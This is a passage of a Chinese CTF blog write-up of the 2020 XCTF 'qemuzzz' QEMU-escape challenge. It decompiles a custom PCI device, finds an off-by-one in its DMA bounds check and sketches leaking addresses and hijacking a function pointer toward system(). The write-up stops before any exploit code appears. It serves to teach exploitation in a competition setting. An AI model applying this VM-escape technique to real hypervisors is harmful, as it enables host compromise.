@@ -1,0 +1,1387 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=STZhongsong:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|consolas:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/014.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/014.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/014.jpg?v=5.1.4">
+
+
+
+
+
+
+  <meta name="keywords" content="Qemu逃逸,RealWorld,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="qemuzzz前言2020XCTF高校网络安全专题挑战赛的华为云专场在12.23举行，因为某些原因队里几位本科师傅决定在期末周中抽出一天冲个前三，我比较菜，逃逸相关的题目中只做出了这一道题，在此记录一下解题过程。 解题过程逆向，函数功能分析首先用strings看了一下，发现是在20.04上编译的，于是在ubuntu20.04的docker中尝试启动，幸运地发现可以直接启动：   查看launch.">
+<meta name="keywords" content="Qemu逃逸,RealWorld">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析">
+<meta property="og:url" content="http://yoursite.com/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/index.html">
+<meta property="og:site_name" content="xiaoxiaorenwu">
+<meta property="og:description" content="qemuzzz前言2020XCTF高校网络安全专题挑战赛的华为云专场在12.23举行，因为某些原因队里几位本科师傅决定在期末周中抽出一天冲个前三，我比较菜，逃逸相关的题目中只做出了这一道题，在此记录一下解题过程。 解题过程逆向，函数功能分析首先用strings看了一下，发现是在20.04上编译的，于是在ubuntu20.04的docker中尝试启动，幸运地发现可以直接启动：   查看launch.">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_d9ba30d24d3cc03490b8a7dfdec0fe77.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_89e87144b5bb32064474b9f20e8b562c.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_5149717b7ab0f77a877e8c6f6be0e1a4.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_38e90742079fc7f28f9d2e338e18aa7b.png">
+<meta property="og:image" content="https://md.byr.moe/uploads/upload_1162ddcb649b12eaf45433aa67548ee6.png">
+<meta property="og:updated_time" content="2021-01-09T15:33:37.389Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析">
+<meta name="twitter:description" content="qemuzzz前言2020XCTF高校网络安全专题挑战赛的华为云专场在12.23举行，因为某些原因队里几位本科师傅决定在期末周中抽出一天冲个前三，我比较菜，逃逸相关的题目中只做出了这一道题，在此记录一下解题过程。 解题过程逆向，函数功能分析首先用strings看了一下，发现是在20.04上编译的，于是在ubuntu20.04的docker中尝试启动，幸运地发现可以直接启动：   查看launch.">
+<meta name="twitter:image" content="https://md.byr.moe/uploads/upload_d9ba30d24d3cc03490b8a7dfdec0fe77.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","width":350,"display":"hide","offset":20,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/">
+
+
+
+
+
+  <title>XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析 | xiaoxiaorenwu</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">xiaoxiaorenwu</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">生活的艰辛，三分来自压力，七分来自攀比，我想做个小人物</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/xxrw.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiaoxiaorenwu">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-24T18:00:00+08:00">
+                2020-12-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-PWN/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-PWN</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2020/12/24/XCTF高校网络安全专题挑战赛_华为云专场_qemuzzz解题过程分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10 min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="qemuzzz"><a href="#qemuzzz" class="headerlink" title="qemuzzz"></a>qemuzzz</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>2020XCTF高校网络安全专题挑战赛</code>的<code>华为云专场</code>在<code>12.23</code>举行，因为某些原因队里几位本科师傅决定在期末周中抽出一天冲个前三，我比较菜，逃逸相关的题目中只做出了这一道题，在此记录一下解题过程。</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="逆向，函数功能分析"><a href="#逆向，函数功能分析" class="headerlink" title="逆向，函数功能分析"></a>逆向，函数功能分析</h3><p>首先用<code>strings</code>看了一下，发现是在<code>20.04</code>上编译的，于是在<code>ubuntu20.04</code>的<code>docker</code>中尝试启动，幸运地发现可以直接启动：</p>
+<p><img src="https://md.byr.moe/uploads/upload_d9ba30d24d3cc03490b8a7dfdec0fe77.png" alt=""></p>
+<p><img src="https://md.byr.moe/uploads/upload_89e87144b5bb32064474b9f20e8b562c.png" alt=""></p>
+<p>查看<code>launch.sh</code>，发现<code>qemu</code>加载了名为<code>zzz</code>的设备，根据经验可知这就是我们的目标设备了，出题人比较善良，没有去除符号表，直接搜索函数名称即可得到相关函数，配合<code>zzz_class_init</code>和<code>lspci</code>可以发现<code>zzz</code>为<code>00:04.0</code>这个设备：</p>
+<p><img src="https://md.byr.moe/uploads/upload_5149717b7ab0f77a877e8c6f6be0e1a4.png" alt=""></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">zzz_class_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = object_class_dynamic_cast_assert(</span><br><span class="line">             a1,</span><br><span class="line">             <span class="string">"pci-device"</span>,</span><br><span class="line">             <span class="string">"/opt/qemu-5.2.0/include/hw/pci/pci.h"</span>,</span><br><span class="line">             <span class="number">201L</span>L,</span><br><span class="line">             <span class="string">"PCI_DEVICE_CLASS"</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">0xB0</span>) = pci_zzz_realize;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">0xB8</span>) = pci_zzz_uninit;</span><br><span class="line">  *(_DWORD *)(result + <span class="number">0xD0</span>) = <span class="number">0x23331234</span>;    <span class="comment">// &lt; === here !!!</span></span><br><span class="line">  *(_BYTE *)(result + <span class="number">0xD4</span>) = <span class="number">16</span>;</span><br><span class="line">  *(_WORD *)(result + <span class="number">0xD6</span>) = <span class="number">0xFF</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://md.byr.moe/uploads/upload_38e90742079fc7f28f9d2e338e18aa7b.png" alt=""></p>
+<p>然后开始分析设备的相关功能，首先其在初始化实例时，向设备控制块的<code>0x19F0</code>和<code>0x19F8</code>偏移处赋值了设备控制块的基址和<code>cpu_physical_memory_rw</code>函数的地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">zzz_instance_init</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = object_dynamic_cast_assert(a1, &amp;off_7CE55E, <span class="string">"../hw/misc/zzz.c"</span>, <span class="number">135L</span>L, <span class="string">"zzz_instance_init"</span>);</span><br><span class="line">  *(_QWORD *)(result + <span class="number">0x19F0</span>) = result;</span><br><span class="line">  *(_QWORD *)(result + <span class="number">0x19F8</span>) = cpu_physical_memory_rw;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在<code>pci_zzz_realize</code>中注册了一块<code>0x100000</code>的<code>mmio</code>内存块：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">pci_zzz_realize</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *(_BYTE *)(*(_QWORD *)(a1 + <span class="number">0x90</span>) + <span class="number">0x3D</span>LL) = <span class="number">1</span>;</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">0x8F0</span>, a1, zzz_mmio_ops, a1, <span class="string">"zzz-mmio"</span>, <span class="number">0x100000</span>LL);</span><br><span class="line">  <span class="keyword">return</span> pci_register_bar(a1, <span class="number">0L</span>L, <span class="number">0L</span>L, a1 + <span class="number">0x8F0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看内存块对应的读写函数<code>zzz_mmio_read &amp;&amp; zzz_mmio_write</code>，读函数中并没有什么问题，就是用户传入<code>offset</code>，然后从设备缓冲区中对应<code>offset</code>处取出一个字符返回给用户，设备缓冲区范围为<code>[a1+0x9F0,a1+0x19F0)</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">zzz_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    result = *(<span class="keyword">unsigned</span> __int8 *)(a1 + a2 + <span class="number">0x9F0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>写函数中有五个功能，在分析功能前，先阐明<code>*(QWORD*)(a1+0x9E0)</code>为<code>phyaddr</code>，<code>*(WORD*)(a1+0x9E8)</code>为<code>base</code>，<code>base &amp; 0x7FFE</code>为<code>len</code>，<code>*(unsigned int16*)(a1+0x9EA)</code>为<code>offset</code>，第一个功能为向<code>phyaddr</code>赋值，需要注意的是用户传入的物理地址需要提前<code>&gt;&gt;12</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0x20</span> )</span><br><span class="line">&#123;</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">0x9E0</span>) = a3 &lt;&lt; <span class="number">12</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第二个功能为向<code>offset</code>赋值，有上下限检测，不可大于<code>0xfff</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0x10</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( a3 &gt; <span class="number">0xFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_WORD *)(a1 + <span class="number">0x9EA</span>) &gt; <span class="number">0xFFF</span>u )</span><br><span class="line">        *(_WORD *)(a1 + <span class="number">0x9EA</span>) = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)(a1 + <span class="number">0x9EA</span>) = a3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第三个功能为向<code>base</code>赋值：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0x18</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *(_WORD *)(a1 + <span class="number">0x9E8</span>) = a3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第四个功能刚开始看感觉很奇怪，其以<code>offset</code>为起始，<code>len</code>为长度，逐<code>16bit</code>将设备缓冲区中的数据异或<code>521(0x209)</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0x50</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v9 = *(<span class="keyword">unsigned</span> __int16 *)(a1 + <span class="number">0x9EA</span>);</span><br><span class="line">  v10 = *(_WORD *)(a1 + <span class="number">0x9E8</span>) &amp; <span class="number">0x7FFE</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)v9 + v10 &gt;= <span class="number">0x1000</span> )</span><br><span class="line">    v10 = <span class="number">0xFFF</span> - v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = v9 + a1; v10 / <span class="number">2</span> &gt; (<span class="keyword">int</span>)v9; i += <span class="number">2L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_WORD *)(i + <span class="number">0x9F0</span>) ^= <span class="number">0x209</span>u;</span><br><span class="line">    LODWORD(v9) = v9 + <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第五个功能为核心功能，其使用<code>cpu_physical_memory_rw</code>函数(以函数指针的形式调用)对内存进行直接读写(可以看作实现了一个简易的<code>DMA</code>)，其中<code>base &amp; 1</code>作为读写标志位：</p>
+<ol>
+<li>当<code>base &amp; 1 == 1</code>时，从设备缓冲区的<code>offset</code>起向<code>phyaddr</code>拷贝<code>len</code>个字节的数据。</li>
+<li>当<code>base &amp; 1 == 0</code>时，从<code>phyaddr</code>起向设备缓冲区的<code>offset</code>拷贝<code>len</code>个字节的数据。</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0x60</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = *(_QWORD *)(a1 + <span class="number">0x19F0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (*(_QWORD *)(v3 + <span class="number">0x9E0</span>) &amp; <span class="number">0xFFF</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    base = *(_WORD *)(v3 + <span class="number">0x9E8</span>);</span><br><span class="line">    offset = *(<span class="keyword">unsigned</span> __int16 *)(v3 + <span class="number">0x9EA</span>);</span><br><span class="line">    len = base &amp; <span class="number">0x7FFE</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)(offset + (base &amp; <span class="number">0x7FFE</span>) - <span class="number">1</span>) &lt;= <span class="number">0x1000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(<span class="keyword">void</span> (__fastcall **)(_QWORD, __int64, _QWORD, __int64))(a1 + <span class="number">0x19F8</span>);</span><br><span class="line">      v8 = v3 + offset + <span class="number">0x9F0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (base &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v7(*(_QWORD *)(v3 + <span class="number">0x9E0</span>), v8, len, <span class="number">1L</span>L);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v7(*(_QWORD *)(v3 + <span class="number">0x9E0</span>), v8, len, <span class="number">0L</span>L);</span><br><span class="line">      <span class="keyword">if</span> ( *(__int16 *)(v3 + <span class="number">0x9E8</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        pci_set_irq(v3, <span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞点位于功能五中，在对<code>offset+len</code>的上限进行检测时，本应是<code>offset + len &lt;= 0x1000</code>写为了<code>offset + len - 1 &lt;= 0x1000</code>，也就是说<code>offset+len</code>可以达到<code>0x1001</code>的长度，而设备缓冲区只有<code>0x1000</code>长度，产生了一个<code>off-by-one</code>，进而可以读写到<code>a1+0x19F0</code>处的值：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0x60</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v3 = *(_QWORD *)(a1 + <span class="number">0x19F0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (*(_QWORD *)(v3 + <span class="number">0x9E0</span>) &amp; <span class="number">0xFFF</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    base = *(_WORD *)(v3 + <span class="number">0x9E8</span>);</span><br><span class="line">    offset = *(<span class="keyword">unsigned</span> __int16 *)(v3 + <span class="number">0x9EA</span>);</span><br><span class="line">    len = base &amp; <span class="number">0x7FFE</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)(offset + (base &amp; <span class="number">0x7FFE</span>) - <span class="number">1</span>) &lt;= <span class="number">0x1000</span> ) <span class="comment">// &lt; === here!!!</span></span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(<span class="keyword">void</span> (__fastcall **)(_QWORD, __int64, _QWORD, __int64))(a1 + <span class="number">0x19F8</span>);</span><br><span class="line">      v8 = v3 + offset + <span class="number">0x9F0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (base &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">        v7(*(_QWORD *)(v3 + <span class="number">0x9E0</span>), v8, len, <span class="number">1L</span>L);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v7(*(_QWORD *)(v3 + <span class="number">0x9E0</span>), v8, len, <span class="number">0L</span>L);</span><br><span class="line">      <span class="keyword">if</span> ( *(__int16 *)(v3 + <span class="number">0x9E8</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        pci_set_irq(v3, <span class="number">1u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>先<code>checksec</code>看一下，发现保护全开，加上题目中存在<code>system</code>函数和函数指针(<code>cpu_physical_memory_rw</code>)，所以初步思路为考虑泄露<code>elfbase</code>并劫持函数指针来劫持执行流。</p>
+<p><img src="https://md.byr.moe/uploads/upload_1162ddcb649b12eaf45433aa67548ee6.png" alt=""></p>
+<h4 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h4><p>因为可以读写<code>a1+0x19F0</code>处的值，所以我们可以先将其读出，然后在加上<code>0x10</code>写回去，这样等于将设备控制块整体向后移动了<code>0x10</code>字节(需要提前布置好<code>base</code>和<code>offset</code>)，这样我们再用功能五读数据时就可以将设备控制块的基址和<code>cpu_physical_memory_rw</code>地址读出，从而获取到堆地址和<code>elfbase</code>。</p>
+<p>但是<code>leak</code>之后的问题是我们不再能使用功能一和功能二控制<code>offset</code>和<code>base</code>了，所以没办法将读标志位改为写标志位来进行<code>hijack</code>。</p>
+<h4 id="hijack"><a href="#hijack" class="headerlink" title="hijack"></a>hijack</h4><p>这时候需要用到奇怪的功能四了，其将设备缓冲区中数据与<code>521</code>异或用以将读标志位改为写标志位，但是为了保证异或后的<code>len</code>和<code>offset</code>仍然可以修改到函数指针和设备控制块基址，所以需要用<code>z3</code>解一个方程，这应该也是题目名字叫做<code>qemuzzz</code>的原因吧：</p>
